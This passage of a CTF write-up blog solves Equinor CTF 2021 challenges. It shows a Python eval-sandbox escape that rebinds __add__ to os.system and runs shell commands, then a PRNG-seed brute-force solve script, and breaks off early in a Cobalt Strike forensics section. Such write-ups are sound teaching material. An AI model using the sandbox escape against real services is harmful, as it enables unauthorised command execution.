aria-label=logo height=45>Blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://bootplug.io/archive title=Archive><span>Archive</span></a></li><li><a href=https://bootplug.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://bootplug.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://bootplug.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bootplug.io/>Home</a>&nbsp;¬ª&nbsp;<a href=https://bootplug.io/posts/>Posts</a>&nbsp;¬ª&nbsp;<a href=https://bootplug.io/posts/ctf/>CTFs</a></div><h1 class=post-title>Equinor CTF 2021</h1><div class=post-description>Writeups from Equinor's CTF</div><div class=post-meta>October 31, 2021&nbsp;¬∑&nbsp;20 min&nbsp;¬∑&nbsp;zup, KFBI, klarz</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#misc aria-label=Misc>Misc</a><ul><li><a href=#-kalk- aria-label="üî• Kalk üî•">üî• Kalk üî•</a></li><li><a href=#-know-your-encoding- aria-label="üî• Know your encoding üî•">üî• Know your encoding üî•</a><ul><li><a href=#count-variable aria-label="count variable">count variable</a></li><li><a href=#timezones aria-label=Timezones>Timezones</a></li><li><a href=#time-invoked-twice aria-label="time() invoked twice">time() invoked twice</a></li><li><a href=#further-explanation aria-label="Further explanation">Further explanation</a><ul><li><a href=#brute-force aria-label="brute force">brute force</a></li><li><a href=#decoding aria-label=decoding>decoding</a></li><li><a href=#submitting aria-label=submitting>submitting</a></li></ul></li></ul></li></ul></li><li><a href=#forensics aria-label=Forensics>Forensics</a><ul><li><a href=#-eastbound--pwned- aria-label="üî• Eastbound &amp;amp; Pwned üî•">üî• Eastbound & Pwned üî•</a><ul><li><a href=#cobalt-strike aria-label="Cobalt Strike">Cobalt Strike</a><ul><li><a href=#c2-communication aria-label="C2 Communication">C2 Communication</a></li><li><a href=#beacon-configuration aria-label="Beacon Configuration">Beacon Configuration</a></li><li><a href=#decrypting-cobalt-strike-traffic aria-label="Decrypting Cobalt Strike Traffic">Decrypting Cobalt Strike Traffic</a></li></ul></li><li><a href=#solution aria-label=Solution>Solution</a><ul><li><a href=#extracting-and-decoding-beacon-configuration aria-label="Extracting And Decoding Beacon Configuration">Extracting And Decoding Beacon Configuration</a></li><li><a href=#dump-memory-of-the-infected-process aria-label="Dump Memory Of The Infected Process">Dump Memory Of The Infected Process</a></li><li><a href=#extract-keys aria-label="Extract Keys">Extract Keys</a></li><li><a href=#decrypt-c2-communication aria-label="Decrypt C2 Communication">Decrypt C2 Communication</a></li></ul></li></ul></li></ul></li><li><a href=#shellcoding aria-label=Shellcoding>Shellcoding</a><ul><li><a href=#-shellcoding-0x05- aria-label="üî• Shellcoding 0x05 üî•">üî• Shellcoding 0x05 üî•</a></li></ul></li></ul></div></details></div><div class=post-content><h1 id=misc>Misc<a hidden class=anchor aria-hidden=true href=#misc>#</a></h1><h2 id=-kalk->üî• Kalk üî•<a hidden class=anchor aria-hidden=true href=#-kalk->#</a></h2><blockquote><p><strong>Author</strong>: <code>null</code></p><p><strong>Description:</strong>
I heard you needed a new calculator for your math course? Why buy a new one when you can just use my Calculator-as-a-Service instead!</p><p><code>nc io.ept.gg 30046</code></p></blockquote><p>We get a Python script to download:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> dis
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Math</span>(dict):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>pi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>kalk</span>(src, locals):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;=&#39;</span> <span style=color:#f92672>in</span> src:
</span></span><span style=display:flex><span>        co <span style=color:#f92672>=</span> compile(src, <span style=color:#e6db74>&#34;kalk&#34;</span>, <span style=color:#e6db74>&#34;single&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> opc <span style=color:#f92672>in</span> dis<span style=color:#f92672>.</span>get_instructions(co):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> opc<span style=color:#f92672>.</span>opname <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> [<span style=color:#e6db74>&#39;LOAD_NAME&#39;</span>, <span style=color:#e6db74>&#39;LOAD_CONST&#39;</span>, <span style=color:#e6db74>&#39;STORE_NAME&#39;</span>, <span style=color:#e6db74>&#39;STORE_ATTR&#39;</span>, <span style=color:#e6db74>&#39;RETURN_VALUE&#39;</span>]:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>&#34;Bonk! &gt;.&lt;&#34;</span>, opc<span style=color:#f92672>.</span>opname)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>        eval(co, {}, locals)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        co <span style=color:#f92672>=</span> compile(src, <span style=color:#e6db74>&#34;kalk&#34;</span>, <span style=color:#e6db74>&#34;eval&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> opc <span style=color:#f92672>in</span> dis<span style=color:#f92672>.</span>get_instructions(co):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;CALL&#39;</span> <span style=color:#f92672>in</span> opc<span style=color:#f92672>.</span>opname:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>&#39;No U! &gt;.&lt;&#39;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        _ <span style=color:#f92672>=</span> eval(co, {}, locals <span style=color:#f92672>|</span> {<span style=color:#e6db74>&#39;math&#39;</span>: Math(), <span style=color:#e6db74>&#39;tease&#39;</span>: os<span style=color:#f92672>.</span>system})
</span></span><span style=display:flex><span>        locals[<span style=color:#e6db74>&#39;_&#39;</span>] <span style=color:#f92672>=</span> _
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> _
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>locals <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> kalk(input(<span style=color:#e6db74>&#39;&gt; &#39;</span>), locals)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> r <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>        print(repr(r))
</span></span></code></pre></div><p>It looks like this is a calculator as a service. When you connect to the server
you can do different math operations. This is done by executing the input you send as
Python code. It uses eval to do so.</p><p>It looks like this application block certain types of operations. It does so by compiling the input
that we send in, and uses the <code>dis</code> module to get the instructions and opnames from the compiled code.
You can for example don&rsquo;t run any functions or methods, because it blocks all opname that contains <code>CALL</code>.</p><p>In the kalk function there is an if statement that checks for <code>=</code> in our input. If we don&rsquo;t assign a value to
any variable, it will jump down to the <em>else</em> block and run our code there. As you can see, there are two objects
included in the local variables in this eval. <code>math</code> contains a Math-object and <code>tease</code> contains the <code>os.system</code> method.</p><p>Since <code>math</code> is an object of the Math-class, we can probably try to overwrite a dunder-method (method names with double underscores
which are called in specific ways). The only problem is that we cannot assign anything to the <code>math</code> object, since then we will
be in the first if-block where this object is not available.</p><p>UnblvR on my team found a neat way to move variables from the second eval to the first eval by using <code>_</code>.
<code>_</code> is a special variable that contains the return value of the last instruction. This variable is also available in
the first eval even though we did the instruction in the second eval.</p><p>Now we can assign <code>math</code> to another variable:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>nc io<span style=color:#f92672>.</span>ept<span style=color:#f92672>.</span>gg <span style=color:#ae81ff>30046</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> math 
</span></span><span style=display:flex><span>{}
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> test <span style=color:#f92672>=</span> _
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> test
</span></span><span style=display:flex><span>{}
</span></span></code></pre></div><p>The plan is to get the uninitialized Math class into a variable
and then overwrite the <code>__add__</code> method to be <code>tease</code> which is <code>os.system</code>.
The <code>__add__</code> method takes one argument (which is the value you want to add to the object).
os.system() also takes one argument, so in theory we can then do a system command by adding
the command we want to run to the object like this:
<code>math + 'ls -la'</code></p><p>The command <code>ls -la</code> should then be executed.</p><p>You can read more about dunder methods <a href=https://www.section.io/engineering-education/dunder-methods-python/#71-add>HERE</a>!</p><p>First we need to get the Math class:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>nc io<span style=color:#f92672>.</span>ept<span style=color:#f92672>.</span>gg <span style=color:#ae81ff>30046</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> math<span style=color:#f92672>.</span>__class__
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>__main__</span><span style=color:#f92672>.</span>Math<span style=color:#e6db74>&#39;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> Math <span style=color:#f92672>=</span> _
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> Math
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>__main__</span><span style=color:#f92672>.</span>Math<span style=color:#e6db74>&#39;&gt;</span>
</span></span></code></pre></div><p>Great, now we can overwrite <code>__add__</code> with <code>os.system</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>&gt;</span> tease
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>built<span style=color:#f92672>-</span><span style=color:#f92672>in</span> function system<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> Math<span style=color:#f92672>.</span>__add__ <span style=color:#f92672>=</span> _
</span></span></code></pre></div><p>At last we can set the class of <code>math</code> to be our new class.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>&gt;</span> math
</span></span><span style=display:flex><span>{}
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> math <span style=color:#f92672>=</span> _
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> math<span style=color:#f92672>.</span>__class__ <span style=color:#f92672>=</span> Math
</span></span></code></pre></div><p>Now we should be able to run system commands by doing addition.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>&gt;</span> math <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;id&#34;</span>
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>(kalk) gid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>(kalk) groups<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>(kalk)
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> math <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;ls&#34;</span>
</span></span><span style=display:flex><span>flag<span style=color:#f92672>.</span>txt
</span></span><span style=display:flex><span>kalk<span style=color:#f92672>.</span>py
</span></span><span style=display:flex><span>ynetd
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> math <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;cat flag.txt&#34;</span>
</span></span><span style=display:flex><span>EPT{y0u_br0k3_my_c4lcu1at0r<span style=color:#960050;background-color:#1e0010>!</span>}<span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>And we got the flag, great!</p><p>Flag: <code>EPT{y0u_br0k3_my_c4lcu1at0r!}</code></p><h2 id=-know-your-encoding->üî• Know your encoding üî•<a hidden class=anchor aria-hidden=true href=#-know-your-encoding->#</a></h2><blockquote><p><strong>Author</strong>: <code>zledge</code></p><p><strong>Description:</strong>
Help us decode some very important words! You might be awarded a flag in the end</p><p><code>nc io.ept.gg 30045</code></p></blockquote><p>We are also provided with a file:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> datetime <span style=color:#f92672>import</span> datetime
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> random <span style=color:#f92672>import</span> Random
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> time <span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>chunks</span>(lst, n):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Yield successive n-sized chunks from lst.&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(lst), n):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>yield</span> lst[i:i <span style=color:#f92672>+</span> n]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ALPHABET <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>special_encoding</span>(word, count):
</span></span><span style=display:flex><span>    b <span style=color:#f92672>=</span> Random()
</span></span><span style=display:flex><span>    b<span style=color:#f92672>.</span>seed(int(time() <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> count:
</span></span><span style=display:flex><span>        a <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(b<span style=color:#f92672>.</span>sample(ALPHABET,len(ALPHABET)))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        a <span style=color:#f92672>=</span> ALPHABET
</span></span><span style=display:flex><span>    encoded <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> chunks(<span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join([bin(int(byte))<span style=color:#f92672>.</span>lstrip(<span style=color:#e6db74>&#39;0b&#39;</span>)<span style=color:#f92672>.</span>zfill(<span style=color:#ae81ff>8</span>) <span style=color:#66d9ef>for</span> byte <span style=color:#f92672>in</span> word<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;ascii&#34;</span>)]), <span style=color:#ae81ff>24</span>):
</span></span><span style=display:flex><span>        y <span style=color:#f92672>=</span> list(chunks(x, <span style=color:#ae81ff>6</span>))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> value <span style=color:#f92672>in</span> y:
</span></span><span style=display:flex><span>            encoded <span style=color:#f92672>+=</span> a[int(value<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>6</span>, <span style=color:#e6db74>&#34;0&#34;</span>), <span style=color:#ae81ff>2</span>)]
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>datetime<span style=color:#f92672>.</span>fromtimestamp(int(time()))<span style=color:#e6db74>}</span><span style=color:#e6db74> - Decode the following: </span><span style=color:#e6db74>{</span>encoded<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, flush<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span></code></pre></div><p>Upon connecting we&rsquo;re greeted with this:</p><pre tabindex=0><code>Someone created an encoding scheme, and now we have trouble decoding the output. Can you help us out? You have 5 seconds per word. All words are lowercase ascii before encoding.
Are you ready?
</code></pre><p>After answering we&rsquo;re greeted with a challenge:</p><p><code>2021-10-31 18:20:50 - Decode the following: BgKMAwvTChm</code></p><p>So let&rsquo;s analyze the code:</p><ol><li><code>chunks</code> is explained with a docstring, so we can move on to <code>special_encoding</code> immediately</li><li>First it gets the current amount of seconds since 1. January 1970 also known as unix-time. ( <code>time()</code> )</li><li>This is then multiplied with 1000 to get millisecond precision. (<code>time()*1000</code>)</li><li>Lastly it&rsquo;s fed into a random generator as a seed.</li><li>based on a variable <code>count</code> it then either generated a random shuffled alphabet or uses the standard one</li><li>Then in the following 4 lines it base64 encodes the <code>word</code> (more detailed explanation inside)<ol><li>Firstly it generates a long bitstring and divides it up into 24 bits at a time</li><li>Then it&rsquo;s divided furthermore into chunks of 6 bits</li><li>based on the value of these 6 bits it picks the corresponding character from the &ldquo;alphabet-lookup string&rdquo; <code>a</code></li></ol></li><li>After looping over the whole bitstring the encoded result is provided prefixed with the server&rsquo;s current time.</li></ol><p>Before I show the solution script there&rsquo;s a few gotchas with this challenge that I&rsquo;d like to mention first.</p><h3 id=count-variable>count variable<a hidden class=anchor aria-hidden=true href=#count-variable>#</a></h3><p>As mentioned in the analysis <code>special_encoding</code> chooses which alphabet to use based on a <code>count</code> variable,
however we don&rsquo;t know the value of this variable and so we can&rsquo;t be completely sure of which alphabet is used.
We can make a educated guess and think that <code>count</code> is like a round counter starting at zero, meaning only the
first round will be base64</p><h3 id=timezones>Timezones<a hidden class=anchor aria-hidden=true href=#timezones>#</a></h3><p>Timezones are always a pain to deal with, and this challenge is no exception, because if you just parse the time
from the server you&rsquo;ll get the wrong result. What you need to do, or what I had to do was add 3600 seconds to
the time parsed.</p><h3 id=time-invoked-twice>time() invoked twice<a hidden class=anchor aria-hidden=true href=#time-invoked-twice>#</a></h3><p>So a small detail that&rsquo;s worth noticing is that the time() used to seed the random generator isn&rsquo;t quite the same as the time presented to us. As time is invoked two times instead of being saved to a variable, this didn&rsquo;t pose any problems for me. But could become a problem if the system is already stressed.</p><p>So without further adieu, the solve script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> datetime <span style=color:#f92672>import</span> datetime
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> remote, log
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> random <span style=color:#f92672>import</span> Random
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> string <span style=color:#f92672>import</span> ascii_lowercase
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ALPHABET <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyz+ABCDEFGHIJKLMNOPQRSTUVWXYZ/0123456789&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decode</span>(s, mapping):
</span></span><span style=display:flex><span>    bs <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join([bin(mapping<span style=color:#f92672>.</span>index(c))<span style=color:#f92672>.</span>lstrip(<span style=color:#e6db74>&#34;0b&#34;</span>)<span style=color:#f92672>.</span>zfill(<span style=color:#ae81ff>6</span>) <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> s])
</span></span><span style=display:flex><span>    bs <span style=color:#f92672>=</span> bs[:(len(bs) <span style=color:#f92672>//</span> <span style=color:#ae81ff>8</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> long_to_bytes(int(bs, <span style=color:#ae81ff>2</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>solve</span>(base_time, chall):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> drift <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1000</span>):
</span></span><span style=display:flex><span>        tm <span style=color:#f92672>=</span> base_time <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span> <span style=color:#f92672>+</span> drift
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        b <span style=color:#f92672>=</span> Random()
</span></span><span style=display:flex><span>        b<span style=color:#f92672>.</span>seed(tm)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> mapping <span style=color:#f92672>in</span> [<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(b<span style=color:#f92672>.</span>sample(ALPHABET, len(ALPHABET))), ALPHABET]:
</span></span><span style=display:flex><span>            bts <span style=color:#f92672>=</span> decode(chall, mapping)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> all([chr(char) <span style=color:#f92672>in</span> ascii_lowercase <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> bts]):
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> bts
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        log<span style=color:#f92672>.</span>error(<span style=color:#e6db74>&#34;Couldn&#39;t find solution&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;io.ept.gg&#34;</span>, <span style=color:#ae81ff>30045</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;y&#34;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>100</span>):
</span></span><span style=display:flex><span>    chal <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    dt <span style=color:#f92672>=</span> datetime<span style=color:#f92672>.</span>fromisoformat(chal<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34; - &#34;</span>)[<span style=color:#ae81ff>0</span>])<span style=color:#f92672>.</span>strftime(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    server_time <span style=color:#f92672>=</span> int(dt) <span style=color:#f92672>+</span> <span style=color:#ae81ff>3600</span>  <span style=color:#75715e># adjust to the same timezone as the server</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    ans <span style=color:#f92672>=</span> solve(server_time, chal<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;: &#34;</span>)[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>strip())
</span></span><span style=display:flex><span>    print(ans)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(ans)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> r<span style=color:#f92672>.</span>recvline() <span style=color:#f92672>==</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Correct!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><h3 id=further-explanation>Further explanation<a hidden class=anchor aria-hidden=true href=#further-explanation>#</a></h3><h4 id=brute-force>brute force<a hidden class=anchor aria-hidden=true href=#brute-force>#</a></h4><p>So since we know the time the random alphabet was generated we can just reproduce
it locally. After we have the time (that&rsquo;s corrected for the timezone) we have to
do some brute force, because the time value we&rsquo;re provided with is only in second
resolution and the random seed function required millisecond resolution. Using this base value we should brute force around that base I chose a span of 0-1000ms after the base time.</p><h4 id=decoding>decoding<a hidden class=anchor aria-hidden=true href=#decoding>#</a></h4><p>Now inside the loop we can feed these time values into the <code>Random.seed()</code> function. Then we can generate our random alphabet and try to decode the challenge sent by the server with both the random alphabet and the standard one. The decoding works by taking each char in the encoded string and finding it&rsquo;s corresponding position in the alphabet, then we convert that value to binary, stripping the <code>0b</code> and ensuring it&rsquo;s 6 chars long. After that we strip the bitstring into the nearest length that&rsquo;s divisible by 8. Then we parse it as a binary number and convert it from a int to bytes, and we&rsquo;re done.</p><h4 id=submitting>submitting<a hidden class=anchor aria-hidden=true href=#submitting>#</a></h4><p>So now we have a possible correct result, but since we&rsquo;re brute forcing this could be a garbage value as well. So we have to check that all the characters are printable
and ASCII-lowercase, then we can be pretty certain that we&rsquo;ve found the correct answer. But we won&rsquo;t know for sure before the server responds with <code>Correct!</code>. Again if we bruteforced with a wider range for the <code>drift</code> we might begin to get false positives.</p><p>Flag: <code>EPT{kn0w-y0ur-en0ding!}</code></p><h1 id=forensics>Forensics<a hidden class=anchor aria-hidden=true href=#forensics>#</a></h1><h2 id=-eastbound--pwned->üî• Eastbound & Pwned üî•<a hidden class=anchor aria-hidden=true href=#-eastbound--pwned->#</a></h2><blockquote><p><strong>Author:</strong> <code>LOLASL</code></p><p><strong>Description:</strong> KennyP thinks that Anti-Virus is for wussies and that his enemies can&rsquo;t touch him, but we are now observing hits on a signature that could indicate the presence of Cobalt Strike on his computer.</p><p>We have retrieved the network traffic in question and a memory dump of the machine (Windows 10 x64 Build 19043.1237), can you figure out what the attacker has been up to?</p><p><code>EastboundAndPwned.zip</code></p></blockquote><p>We are provided with an archive (<code>EastboundAndPwned.zip</code>), which contains a network capture (<code>LA-FLAMA-BLANCA-20211025-071559.pcap</code>) and a memory dump (<code>LA-FLAMA-BLANCA-20211025-071559.raw</code>).</p><h3 id=cobalt-strike>Cobalt Strike<a hidden class=anchor aria-hidden=true href=#cobalt-strike>#</a></h3><p>The challenge description mentions Cobalt Strike, which is:</p><blockquote><p>[Cobalt Strike] is a commercial, full-featured, remote access tool that bills itself as &ldquo;adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors&rdquo;. Cobalt Strike‚Äôs interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.</p></blockquote><p>Source: <a href=https://attack.mitre.org/software/S0154/>MITRE ATT&CK¬Æ</a></p><p>In short: it is a tool that is used to be able to remotely control a system. Malicious actors have used it for years to deploy ‚ÄúListeners‚Äù on victim machines. To solve this challenge we need to get a better understanding of how Cobalt Strike communicates, and how it can be configured.</p><h4 id=c2-communication>C2 Communication<a hidden class=anchor aria-hidden=true href=#c2-communication>#</a></h4><p><a href=https://talos-intelligence-site.s3.amazonaws.com/production/document_files/files/000/095/031/original/Talos_Cobalt_Strike.pdf>The art and science of detecting Cobalt Strike</a> by Nick Navis (<a href=https://twitter.com/nickmavis>@nickmavis</a>) from Cisco Talos, describes the C2 communication as 